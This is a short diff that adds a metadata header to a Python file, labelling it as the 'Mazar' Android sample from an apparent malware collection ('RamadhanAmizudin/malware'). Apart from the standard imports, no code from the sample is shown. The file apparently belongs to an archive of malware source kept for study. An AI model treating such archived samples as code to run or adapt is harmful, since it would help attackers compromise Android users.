@@ -1,4 +1,15 @@
 #!/usr/bin/env python
+# ------------------------------------------------------------
+# name      Mazar
+# type      android
+# cve       —
+# year      unknown
+# os        Android
+# authors   unknown
+# source    RamadhanAmizudin/malware
+# archived  RamadhanAmizudin, krisyotam (2026)
+# notes     —
+# ------------------------------------------------------------
 import os
 import sys
 
